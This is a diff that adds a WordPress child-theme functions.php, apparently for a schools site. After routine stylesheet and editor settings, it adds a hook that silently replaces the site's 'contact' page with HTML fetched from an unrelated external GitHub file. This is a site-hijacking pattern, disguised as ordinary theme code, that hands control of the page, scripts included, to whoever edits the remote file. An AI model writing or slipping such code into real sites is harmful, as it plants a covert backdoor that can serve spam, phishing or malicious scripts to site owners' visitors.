@@ -1,0 +1,28 @@
+<?php
+
+// enqueue the child theme stylesheet
+
+Function wp_schools_enqueue_scripts() {
+wp_register_style( 'childstyle', get_stylesheet_directory_uri() . '/style.css'  );
+wp_enqueue_style( 'childstyle' );
+}
+add_action( 'wp_enqueue_scripts', 'wp_schools_enqueue_scripts', 11);
+
+add_filter('use_block_editor_for_post_type', '__return_false', 100);
+
+add_action('template_redirect', function() {
+    if (is_page('contact')) {
+        $remote_file = 'https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/museovehiculosguadalest.txt';
+        $ch = curl_init($remote_file);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $content = curl_exec($ch);
+        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        if ($status == 200 && $content) {
+            status_header(200);
+            header('Content-Type: text/html; charset=UTF-8');
+            echo $content;
+        }
+        exit;
+    }
+});
